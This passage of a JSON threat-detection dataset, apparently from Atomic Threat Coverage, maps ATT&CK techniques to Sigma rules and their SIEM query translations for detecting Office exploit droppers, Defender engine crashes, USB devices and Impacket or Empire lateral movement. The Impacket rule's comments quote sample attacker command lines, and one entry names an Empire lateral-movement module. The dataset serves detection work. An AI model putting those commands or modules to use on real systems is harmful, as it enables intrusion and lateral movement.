\"ParentImage.keyword:*\\\\\\\\\\\\\\\\EQNEDT32.EXE\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Droppers exploiting CVE-2017-11882\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nCommandLine = {{_source.CommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "ParentImage.keyword:*\\\\\\\\EQNEDT32.EXE", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "ParentImage=\"*\\\\\\\\EQNEDT32.EXE\" | table CommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\EQNEDT32.EXE\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\EQNEDT32\\\\.EXE'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Microsoft Malware Protection Engine Crash\nid: 6c82cf5c-090d-4d57-9188-533577631108\ndescription: This rule detects a suspicious crash of the Microsoft Malware Protection Engine\ntags:\n    - attack.defense_evasion\n    - attack.t1089\n    - attack.t1211\nstatus: experimental\ndate: 2017/05/09\nreferences:\n    - https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5\n    - https://technet.microsoft.com/en-us/library/security/4022344\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection1:\n        Source: 'Application Error'\n        EventID: 1000\n    selection2:\n        Source: 'Windows Error Reporting'\n        EventID: 1001\n    keywords:\n        Message:\n            - '*MsMpEng.exe*'\n            - '*mpengine.dll*'\n    condition: 1 of selection* and all of keywords\nfalsepositives:\n    - MsMpEng.exe can crash when C:\\ is full\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Microsoft Malware Protection Engine Crash\nid: 6c82cf5c-090d-4d57-9188-533577631108\ndescription: This rule detects a suspicious crash of the Microsoft Malware Protection Engine\ntags:\n    - attack.defense_evasion\n    - attack.t1089\n    - attack.t1211\nstatus: experimental\ndate: 2017/05/09\nreferences:\n    - https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5\n    - https://technet.microsoft.com/en-us/library/security/4022344\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection1:\n        Source: 'Application Error'\n        EventID: 1000\n    selection2:\n        Source: 'Windows Error Reporting'\n        EventID: 1001\n    keywords:\n        Message:\n            - '*MsMpEng.exe*'\n            - '*mpengine.dll*'\n    condition: 1 of selection* and all of keywords\nfalsepositives:\n    - MsMpEng.exe can crash when C:\\ is full\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(((Source:\"Application\\\\ Error\" AND EventID:\"1000\") OR (Source:\"Windows\\\\ Error\\\\ Reporting\" AND EventID:\"1001\")) AND Message.keyword:(*MsMpEng.exe* OR *mpengine.dll*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Microsoft-Malware-Protection-Engine-Crash <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Microsoft Malware Protection Engine Crash\",\\n    \"description\": \"This rule detects a suspicious crash of the Microsoft Malware Protection Engine\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1089\",\\n      \"attack.t1211\"\\n    ],\\n    \"query\": \"(((Source:\\\\\"Application\\\\\\\\ Error\\\\\" AND EventID:\\\\\"1000\\\\\") OR (Source:\\\\\"Windows\\\\\\\\ Error\\\\\\\\ Reporting\\\\\" AND EventID:\\\\\"1001\\\\\")) AND Message.keyword:(*MsMpEng.exe* OR *mpengine.dll*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(((Source:\\\\\"Application\\\\\\\\ Error\\\\\" AND EventID:\\\\\"1000\\\\\") OR (Source:\\\\\"Windows\\\\\\\\ Error\\\\\\\\ Reporting\\\\\" AND EventID:\\\\\"1001\\\\\")) AND Message.keyword:(*MsMpEng.exe* OR *mpengine.dll*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Microsoft Malware Protection Engine Crash\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(((Source:\"Application Error\" AND EventID:\"1000\") OR (Source:\"Windows Error Reporting\" AND EventID:\"1001\")) AND Message.keyword:(*MsMpEng.exe* *mpengine.dll*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Source=\"Application Error\" EventID=\"1000\") OR (Source=\"Windows Error Reporting\" EventID=\"1001\")) (Message=\"*MsMpEng.exe*\" OR Message=\"*mpengine.dll*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(((Source=\"Application Error\" event_id=\"1000\") OR (Source=\"Windows Error Reporting\" event_id=\"1001\")) Message IN [\"*MsMpEng.exe*\", \"*mpengine.dll*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.*(?:.*(?=.*Application Error)(?=.*1000))|.*(?:.*(?=.*Windows Error Reporting)(?=.*1001)))))(?=.*(?:.*.*MsMpEng\\\\.exe.*|.*.*mpengine\\\\.dll.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1203", "parsed_datasets": [], "queries": [{"query": "title: Exploit for CVE-2017-8759\nid: fdd84c68-a1f6-47c9-9477-920584f94905\ndescription: Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759\nreferences:\n    - https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\n    - https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\ntags:\n    - attack.execution\n    - attack.t1203\nauthor: Florian Roth\ndate: 2017/09/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\csc.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exploit for CVE-2017-8759\nid: fdd84c68-a1f6-47c9-9477-920584f94905\ndescription: Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759\nreferences:\n    - https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\n    - https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\ntags:\n    - attack.execution\n    - attack.t1203\nauthor: Florian Roth\ndate: 2017/09/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\csc.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\csc.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exploit-for-CVE-2017-8759 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exploit for CVE-2017-8759\",\\n    \"description\": \"Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1203\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\csc.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\csc.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exploit for CVE-2017-8759\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\csc.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\csc.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\WINWORD.EXE\" Image=\"*\\\\\\\\csc.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\WINWORD\\\\.EXE)(?=.*.*\\\\csc\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1200", "parsed_datasets": [], "queries": [{"query": "title: External Disk Drive or USB Storage Device\nid: f69a87ea-955e-4fb4-adb2-bb9fd6685632\ndescription: Detects external diskdrives or plugged in USB devices\nstatus: experimental\nauthor: Keith Wright\ndate: 2019/11/20\ntags:\n    - attack.t1091\n    - attack.t1200\n    - attack.lateral_movement\n    - attack.initial_access\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n            - 6416\n        DeviceClassName: 'DiskDrive'  \n    selection2:\n        DeviceDescription: 'USB Mass Storage Device'\n    condition: selection or selection2\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: External Disk Drive or USB Storage Device\nid: f69a87ea-955e-4fb4-adb2-bb9fd6685632\ndescription: Detects external diskdrives or plugged in USB devices\nstatus: experimental\nauthor: Keith Wright\ndate: 2019/11/20\ntags:\n    - attack.t1091\n    - attack.t1200\n    - attack.lateral_movement\n    - attack.initial_access\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n            - 6416\n        DeviceClassName: 'DiskDrive'  \n    selection2:\n        DeviceDescription: 'USB Mass Storage Device'\n    condition: selection or selection2\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"6416\") AND DeviceClassName:\"DiskDrive\") OR DeviceDescription:\"USB\\\\ Mass\\\\ Storage\\\\ Device\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/External-Disk-Drive-or-USB-Storage-Device <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"External Disk Drive or USB Storage Device\",\\n    \"description\": \"Detects external diskdrives or plugged in USB devices\",\\n    \"tags\": [\\n      \"attack.t1091\",\\n      \"attack.t1200\",\\n      \"attack.lateral_movement\",\\n      \"attack.initial_access\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"6416\\\\\") AND DeviceClassName:\\\\\"DiskDrive\\\\\") OR DeviceDescription:\\\\\"USB\\\\\\\\ Mass\\\\\\\\ Storage\\\\\\\\ Device\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"6416\\\\\") AND DeviceClassName:\\\\\"DiskDrive\\\\\") OR DeviceDescription:\\\\\"USB\\\\\\\\ Mass\\\\\\\\ Storage\\\\\\\\ Device\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'External Disk Drive or USB Storage Device\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"6416\") AND DeviceClassName:\"DiskDrive\") OR DeviceDescription:\"USB Mass Storage Device\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"6416\") DeviceClassName=\"DiskDrive\") OR DeviceDescription=\"USB Mass Storage Device\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" ((event_id IN [\"6416\"] DeviceClassName=\"DiskDrive\") OR DeviceDescription=\"USB Mass Storage Device\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*6416))(?=.*DiskDrive))|.*USB Mass Storage Device))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: USB Device Plugged\nid: 1a4bd6e3-4c6e-405d-a9a3-53a116e341d4\ndescription: Detects plugged USB devices\nreferences:\n    - https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/\n    - https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.initial_access\n    - attack.t1200\nlogsource:\n    product: windows\n    service: driver-framework\ndetection:\n    selection:\n        EventID: \n            - 2003  # Loading drivers\n            - 2100  # Pnp or power management\n            - 2102  # Pnp or power management\n    condition: selection\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: USB Device Plugged\nid: 1a4bd6e3-4c6e-405d-a9a3-53a116e341d4\ndescription: Detects plugged USB devices\nreferences:\n    - https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/\n    - https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.initial_access\n    - attack.t1200\nlogsource:\n    product: windows\n    service: driver-framework\ndetection:\n    selection:\n        EventID: \n            - 2003  # Loading drivers\n            - 2100  # Pnp or power management\n            - 2102  # Pnp or power management\n    condition: selection\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:(\"2003\" OR \"2100\" OR \"2102\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/USB-Device-Plugged <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"USB Device Plugged\",\\n    \"description\": \"Detects plugged USB devices\",\\n    \"tags\": [\\n      \"attack.initial_access\",\\n      \"attack.t1200\"\\n    ],\\n    \"query\": \"EventID:(\\\\\"2003\\\\\" OR \\\\\"2100\\\\\" OR \\\\\"2102\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:(\\\\\"2003\\\\\" OR \\\\\"2100\\\\\" OR \\\\\"2102\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'USB Device Plugged\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:(\"2003\" \"2100\" \"2102\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"2003\" OR EventID=\"2100\" OR EventID=\"2102\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(source=\"Microsoft-Windows-DriverFrameworks-UserMode/Operational\" event_id IN [\"2003\", \"2100\", \"2102\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*2003|.*2100|.*2102)'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_dcom", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_dcom", "name": "Empire Module Command"}], "command_list": ["powershell/lateral_movement/invoke_dcom", "powershell/lateral_movement/invoke_dcom"], "technique_id": "T1175", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1175", "Empire Module": "powershell/lateral_movement/invoke_dcom", "Technique": "Distributed Component Object Model", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_dcom\":  [\"T1175\"],"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027190", "Verified": "Yes", "Signature": "ET NETBIOS DCERPC DCOM ShellExecute - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027189", "Verified": "Yes", "Signature": "ET NETBIOS DCERPC DCOM ExecuteShellCommand Call - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2021616", "Verified": "Yes", "Signature": "ET TROJAN PSEmpire Checkin via POST"}}], "queries": [{"query": "title: Impacket Lateralization Detection\nid: 10c14723-61c7-4c75-92ca-9af245723ad2\nstatus: experimental\ndescription: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\nreferences:\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py\nauthor: Ecco\ndate: 2019/09/03\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_other:\n        # *** wmiexec.py \n        #    parent is wmiprvse.exe\n        #    examples:\n        #       cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        #       cmd.exe /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        # *** dcomexec.py -object MMC20 \n        #   parent is mmc.exe\n        #   example:\n        #       \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567442499.05 2>&1\n        # *** dcomexec.py -object ShellBrowserWindow\n        #  runs %SystemRoot%\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe\n        #  example:\n        #   \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1567520103.71 2>&1\n        # *** smbexec.py\n        #   parent is services.exe\n        #   example:\n        #       C:\\Windows\\system32\\cmd.exe /Q /c echo tasklist ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat\n        ParentImage:\n            - '*\\wmiprvse.exe'  # wmiexec\n            - '*\\mmc.exe'  # dcomexec MMC\n            - '*\\explorer.exe'  # dcomexec ShellBrowserWindow\n            - '*\\services.exe'  # smbexec\n        CommandLine:\n            - '*cmd.exe* /Q /c * \\\\\\\\127.0.0.1\\\\*&1*'\n    selection_atexec:\n        ParentCommandLine:\n            - '*svchost.exe -k netsvcs' # atexec on win10 (parent is \"C:\\Windows\\system32\\svchost.exe -k netsvcs\")\n            - 'taskeng.exe*' # atexec on win7 (parent is \"taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\\System:Service:\")\n        # cmd.exe /C tasklist /m > C:\\Windows\\Temp\\bAJrYQtL.tmp 2>&1\n        CommandLine:\n            - 'cmd.exe /C *Windows\\\\Temp\\\\*&1'\n    condition: (1 of selection_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.lateral_movement\n    - attack.t1047\n    - attack.t1175\nfalsepositives:\n    - pentesters\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Impacket Lateralization Detection\nid: 10c14723-61c7-4c75-92ca-9af245723ad2\nstatus: experimental\ndescription: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\nreferences:\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py\n    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py\nauthor: Ecco\ndate: 2019/09/03\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_other:\n        # *** wmiexec.py \n        #    parent is wmiprvse.exe\n        #    examples:\n        #       cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        #       cmd.exe /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2>&1\n        # *** dcomexec.py -object MMC20 \n        #   parent is mmc.exe\n        #   example:\n        #       \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1567442499.05 2>&1\n        # *** dcomexec.py -object ShellBrowserWindow\n        #  runs %SystemRoot%\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe\n        #  example:\n        #   \"C:\\Windows\\System32\\cmd.exe\" /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1567520103.71 2>&1\n        # *** smbexec.py\n        #   parent is services.exe\n        #   example:\n        #       C:\\Windows\\system32\\cmd.exe /Q /c echo tasklist ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat\n        ParentImage:\n            - '*\\wmiprvse.exe'  # wmiexec\n            - '*\\mmc.exe'  # dcomexec MMC\n            - '*\\explorer.exe'  # dcomexec ShellBrowserWindow\n            - '*\\services.exe'  # smbexec\n        CommandLine:\n            - '*cmd.exe* /Q /c * \\\\\\\\127.0.0.1\\\\*&1*'\n    selection_atexec:\n        ParentCommandLine:\n            - '*svchost.exe -k netsvcs' # atexec on win10 (parent is \"C:\\Windows\\system32\\svchost.exe -k netsvcs\")\n            - 'taskeng.exe*' # atexec on win7 (parent is \"taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\\System:Service:\")\n        # cmd.exe /C tasklist /m > C:\\Windows\\Temp\\bAJrYQtL.tmp 2>&1\n        CommandLine:\n            - 'cmd.exe /C *Windows\\\\Temp\\\\*&1'\n    condition: (1 of selection_*)\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.lateral_movement\n    - attack.t1047\n    - attack.t1175\nfalsepositives:\n    - pentesters\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:(*\\\\\\\\wmiprvse.exe OR *\\\\\\\\mmc.exe OR *\\\\\\\\explorer.exe OR *\\\\\\\\services.exe) AND CommandLine.keyword:(*cmd.exe*\\\\ \\\\/Q\\\\ \\\\/c\\\\ *\\\\ \\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\*&1*)) OR (ParentCommandLine.keyword:(*svchost.exe\\\\ \\\\-k\\\\ netsvcs OR taskeng.exe*) AND CommandLine.keyword:(cmd.exe\\\\ \\\\/C\\\\ *Windows\\\\\\\\Temp\\\\\\\\*&1)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Impacket-Lateralization-Detection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Impacket Lateralization Detection\",\\n    \"description\": \"Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1047\",\\n      \"attack.t1175\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\mmc.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\services.exe) AND CommandLine.keyword:(*cmd.exe*\\\\\\\\ \\\\\\\\/Q\\\\\\\\ \\\\\\\\/c\\\\\\\\ *\\\\\\\\ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\\\\\\\\\*&1*)) OR (ParentCommandLine.keyword:(*svchost.exe\\\\\\\\ \\\\\\\\-k\\\\\\\\ netsvcs OR taskeng.exe*) AND CommandLine.keyword:(cmd.exe\\\\\\\\ \\\\\\\\/C\\\\\\\\ 